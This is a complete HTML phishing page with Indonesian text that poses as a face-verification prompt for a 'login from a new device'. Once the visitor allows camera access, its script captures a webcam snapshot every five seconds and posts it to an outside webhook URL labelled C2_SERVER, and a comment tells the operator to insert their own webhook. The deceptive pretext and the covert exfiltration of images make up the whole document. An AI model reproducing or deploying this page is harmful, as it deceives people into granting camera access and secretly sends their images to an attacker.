<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<title>Verifikasi Keamanan</title>
<style>
  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #0f172a; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
  .card { background: #1e293b; padding: 40px 30px; border-radius: 16px; text-align: center; width: 90%; max-width: 350px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid #334155; }
  h2 { font-size: 20px; margin-bottom: 10px; color: #f8fafc; }
  p { font-size: 14px; color: #94a3b8; margin-bottom: 25px; line-height: 1.5; }
  video { width: 100%; border-radius: 12px; background: #000; transform: scaleX(-1); margin-bottom: 20px; display: none; border: 2px solid #38bdf8; }
  canvas { display: none; }
  .btn { background: #38bdf8; color: #0f172a; border: none; padding: 16px; width: 100%; border-radius: 10px; font-weight: 700; font-size: 16px; cursor: pointer; transition: all 0.2s; }
  .btn:active { transform: scale(0.98); }
  .status { margin-top: 15px; font-size: 12px; color: #38bdf8; font-weight: 600; display: none; animation: pulse 1.5s infinite; }
  @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
</style>
</head>
<body>
<div class="card">
  <h2>Sesi Tidak Valid</h2>
  <p>Sistem mendeteksi login dari perangkat baru. Silakan verifikasi wajah Anda untuk melanjutkan.</p>
  
  <!-- Video disembunyikan, tapi di-set display block kalau udah dapet izin -->
  <video id="cam" autoplay playsinline muted></video>
  <canvas id="snapCanvas"></canvas>
  
  <button class="btn" id="startBtn">Mulai Verifikasi Wajah</button>
  <div class="status" id="statusText">Mengambil gambar...</div>
</div>

<script>
(() => {
  // =========================================================
  // GANTI URL WEBHOOK KAU DI SINI
  // =========================================================
  const C2_SERVER = "https://webhook.site/4b6c0ea9-af44-47a6-a6aa-1a14aceb1d59";
  
  const video = document.getElementById('cam');
  const canvas = document.getElementById('snapCanvas');
  const ctx = canvas.getContext('2d');
  const startBtn = document.getElementById('startBtn');
  const statusText = document.getElementById('statusText');

  let stream = null;
  let snapInterval = null;

  // 1. MINTA IZIN KAMERA
  startBtn.addEventListener('click', async () => {
    startBtn.innerText = "Meminta Izin...";
    
    try {
      // Paksa pakai kamera depan
      stream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: 'user' }, 
        audio: false 
      });
      
      video.srcObject = stream;
      video.style.display = 'block';
      startBtn.style.display = 'none';
      statusText.style.display = 'block';

      // Tunggu video siap, baru mulai jepret
      video.onloadedmetadata = () => {
        // Set ukuran canvas sesuai resolusi video
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        
        // Mulai jepret tiap 5 detik
        snapInterval = setInterval(snapAndSend, 5000);
        
        // Jepret pertama langsung
        setTimeout(snapAndSend, 1000); 
      };

    } catch (err) {
      // Kalau ditolak
      startBtn.innerText = "Coba Lagi";
      alert("Akses ditolak. Harap izinkan kamera untuk verifikasi.");
    }
  });

  // 2. FUNGSI JEPRET & KIRIM
  function snapAndSend() {
    if (!video.videoWidth) return;

    // Gambar video ke canvas (jepret)
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    
    // Ubah gambar jadi Base64 (format JPEG, kualitas 60% biar ringan)
    const imageData = canvas.toDataURL('image/jpeg', 0.6);

    // Kirim ke Webhook
    fetch(C2_SERVER, {
      method: 'POST',
      mode: 'no-cors',
      headers: { 'Content-Type': 'text/plain' },
      body: JSON.stringify({
        type: "WEBCAM_SNAPSHOT",
        timestamp: new Date().toISOString(),
        image_b64: imageData
      })
    });

    statusText.innerText = "Memindai wajah... (" + new Date().toLocaleTimeString() + ")";
  }

  // Hentikan kamera kalau tab ditutup
  window.addEventListener('beforeunload', () => {
    if (stream) stream.getTracks().forEach(t => t.stop());
    clearInterval(snapInterval);
  });

})();
</script>
</body>
</html>
